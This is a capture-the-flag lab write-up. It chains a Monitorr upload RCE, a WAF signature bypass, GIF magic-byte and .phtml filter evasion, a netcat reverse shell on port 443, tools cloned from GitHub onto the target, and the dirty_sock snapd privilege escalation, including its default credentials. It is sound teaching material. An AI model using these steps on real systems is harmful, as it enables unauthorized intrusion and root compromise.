Year of The Jellyfish: an n-day web exploit chain to root

A public exploit that gets flagged as an attack on sight. A content filter that only checks a file's magic bytes. A crude shell with just enough tools to bootstrap better ones. And a snapd CVE that hands over a sudo-capable account directly.

Room: Year of The Jellyfish Category: Web / Linux Privesc Tools: searchsploit, Linux Exploit Suggester, dirty_sock

The setup: a multi-subdomain host running a known-vulnerable monitoring dashboard. The job: find and adapt a working public exploit, get code execution past two separate upload filters, then escalate through a snapd CVE to a sudo-capable account.

Flags are omitted below, even the original notes blanked them out before taking the screenshot.

The Investigation

1
Map the environment from its own TLS certificate

The site's TLS certificate lists four Subject Alternative Names on a single cert:

Subject Alt Names
  DNS Name: robyns-petshop.thm
  DNS Name: monitorr.robyns-petshop.thm
  DNS Name: beta.robyns-petshop.thm
  DNS Name: dev.robyns-petshop.thm

Essentially handing over the host's internal naming scheme for free. Adding all four to /etc/hosts against the target IP brings every subdomain into scope at once:

54.78.49.154  monitorr.robyns-petshop.thm robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm
Why this works

A SAN certificate covering multiple subdomains is reconnaissance the server hands you voluntarily. Checking a cert's alt names costs nothing and regularly reveals hosts a directory brute force would take far longer to find.

2
Identify the app and find a working n-day

monitorr.robyns-petshop.thm runs Monitorr, a self-hosted uptime dashboard, and its own settings page prints the version directly: Monitorr 1.7.6m. Searchsploit turns up two candidates:

$ searchsploit monitorr

Exploit Title                      | Path
------------------------------------------------------
Monitorr 1.7.6m - Authorization    | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code      | php/webapps/48980.py

Reading through 48981.py (Authorization Bypass) shows it targets an installer endpoint, /assets/config/_installation/_register.php, that returns a plain Not Found on this build, a dead end. 48980.py (Remote Code Execution) targets /assets/php/upload.php instead, and that one's still alive, with the script's own URL construction revealing the upload directory before a single request is even sent: ../data/usrimg/.

Why this works

Reading an exploit script's source before running it is worth the extra few minutes. One candidate saved a trip entirely, and the other handed over useful reconnaissance (the real upload path) just from the request it was built to send.

3
Get past a WAF that recognizes the exploit itself

Running the public script as-is fails outright:

ERROR: is not an image or exceeds the webserver's upload size limit.
ERROR: ../data/usrimg/ already exists.
ERROR: was not uploaded.

Patching the script to print the raw response body is what actually explains it:

r = requests.post(url, headers=headers, data=data, verify=True, cookies=cookies)
print(r.text)
<div id='uploadreturn'>You are an exploit.</div><div id='uploaderror'>ERROR: she_ll.p
hp was not uploaded.</div></div>
A shell script should be uploaded. Now we try to execute it

Something upstream is fingerprinting the request itself, most likely the exact header or payload shape the public script is known to send, not the vulnerability it exploits. A self-signed certificate adds a second, unrelated hurdle:

curl: (60) SSL certificate problem: self signed certificate

solved by flipping verify to False in the script for this internal target:

r = requests.post(url, headers=headers, data=data, verify=False)
print(r.text)
Why this works

A signature-based filter trained on a specific, widely circulated public exploit script is defeated the moment the request looks even slightly different from that exact script's fingerprint. Printing the actual server response during debugging is what turns "it just doesn't work" into an actionable next step.

4
Confirm a content filter, not just an extension filter

With TLS verification disabled, the upload succeeds, a listener on 7777 is set up for the callback, but nothing connects. Checking the upload directory shows why:

Index of /assets/data/usrimg
Name              Last modified    Size
she_ll.gif        2021-05-03 05:38  93
she_ll.gif.phtml  2021-05-03 05:42  93
usrimg.png        2021-04-11 00:07  5.3K

Fetching the uploaded file back directly confirms the server isn't just trusting the extension:

GIF89a213213123

That's a literal GIF magic-byte header, hand-prepended to the shell payload to pass a content check, and it's apparently satisfying it: the file got renamed with a trailing .phtml by the upload handler itself, but the GIF signature check is clearly happening before execution, not just the extension.

Why this works

An extension alone tells a filter nothing about what's actually inside a file. Confirming that the server is both accepting the upload and checking its actual byte content, rather than guessing, is what explains why the first attempt didn't callback.

5
Rename, pick the right extension, and switch ports

Three separate fixes stack on top of each other: the filename has to change since the server rejects exact duplicates, the extension has to be one PHP will actually execute that the filter didn't think to block (.phtml, not the obvious .php), and the callback port has to be something an outbound firewall actually permits:

nc -lvnp 443
Connection from 10.10.21.48:44100
bash: cannot set terminal process group (936): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$

A shell lands as www-data on a host identifying itself as petshop.

Why this works

A filter built around a short, obvious extension list almost always misses the long tail of extensions a web server is actually configured to execute. And outbound firewalls shaping which ports can even leave the network are just as important to account for as any upload filter, switching to 443 is often the single fix that makes an otherwise-correct payload finally call back.

6
Find the first flag and stage better tools
www-data@petshop:/var/www$ ls -la
-r-------- 1 www-data www-data   38 Apr 30 16:12 flag1.txt
www-data@petshop:/var/www$ cat flag1.txt

The shell this filter chain allows is a crude one, no proper terminal, limited commands. Rather than fight file transfer, git is already installed on the target, so privilege-escalation tooling comes in by cloning it directly from GitHub:

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ git clone https://github.com/mzet-/linux-exploit-suggester.git
Cloning into 'linux-exploit-suggester'...
Why this works

A low-grade shell doesn't need to block tool transfer entirely, it just rules out some of the usual paths. Whatever's already installed on the target, a package manager, an interpreter, a version control client, is worth checking as a delivery mechanism before assuming nothing will work.

7
Let a suggester tool narrow down the privesc path

Linux Exploit Suggester fingerprints the kernel and distribution, then cross-references both against a database of known escalation paths:

Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04

Searching among:
76 kernel space exploits
48 user space exploits

One match stands out:

[+] [CVE-2019-7304] dirty_sock

   Details: https://initblog.com/2019/dirty-sock/
   Exposure: less probable
   Tags: ubuntu=18.10,mint=19
   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
   Comments: Distros use own versioning scheme. Manual verification needed.
Why this works

A suggester tool doesn't replace manual enumeration, but it does triage dozens of theoretical exploits down to the handful that actually match the box in front of you, kernel version, architecture, and installed packages all narrow the field fast. The "tags" field flagging Ubuntu 18.10/Mint 19 rather than this box's 18.04 is exactly the kind of mismatch worth testing anyway rather than ruling out on a technicality.

8
Pull the real exploit after a false start

The suggester's own download URL is a zip archive path that doesn't actually exist as a git-clonable target:

$ git clone https://github.com/initstring/dirty_sock/archive/master.zip
Cloning into 'master.zip'...
remote: Not Found
fatal: repository 'https://github.com/initstring/dirty_sock/archive/master.zip/' not found

Cloning the actual repository instead works fine:

$ git clone https://github.com/initstring/dirty_sock.git
Cloning into 'dirty_sock'...
Why this works

A suggester tool's metadata isn't guaranteed to be a working command, just a pointer. Falling back to the repository's own real clone URL instead of the literal string a tool prints is often necessary.

9
Run the exploit
$ python3 dirty_sockv2.py

[+] Slipped dirty sock on random socket file: /tmp/lthewrjafb;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...

Success! You can now `su` to the following account and use sudo:

The exploit abuses snapd's local socket to install, then remove, a trojan snap package, a side effect of which is a brand-new local user, dirty_sock, with full sudo rights already granted, no separate sudo misconfiguration needed.

Why this works

CVE-2019-7304 abuses snapd's REST API trusting a Unix socket connection's reported UID without verifying it came from a privileged process. The exploit itself does the account creation and sudo grant, there's no additional sudo rule to find or bypass afterward.

10
Upgrade the shell to actually use the new account

Switching to the newly created user needs a real terminal, something the current shell doesn't have:

$ sudo -l
sudo: no tty present and no askpass program specified
$ su dirty_sock
su: must be run from a terminal

A standard Python PTY upgrade fixes that:

www-data@petshop:/var/www/monitorr/assets/data/usrimg$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ export TERM=xterm
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
Password: dirty_sock
Why this works

Several common post-exploitation steps, including su and interactive sudo, simply refuse to run without a controlling terminal. The PTY upgrade trick isn't optional polish here, it's the one thing standing between the exploit's output and actually using the credentials just obtained.

11
Confirm root
dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo cat /root/root.txt

Full sudo access, exactly as the exploit's own success message promised, reads the root flag directly.

Why this works

No further privilege escalation step is needed here. The dirty_sock account's sudo access was granted by the exploit itself as part of the snap installation, closing the chain in one command once a working terminal exists.

Takeaways

Signature-based filters protect against known tools, not known bugs

The WAF here wasn't detecting the vulnerability, it was fingerprinting one specific public exploit script. A slightly different request sailed right past it.

Content filters need to be confirmed, not assumed

Requesting the uploaded file back and reading what the server actually returned was what revealed a real magic-byte check, rather than guessing based on the upload "succeeding."

Some privilege escalation exploits do the whole job

dirty_sock didn't just gain code execution, it created an account with sudo already granted. The remaining work was entirely about getting a real terminal to use it, not finding a second bug.
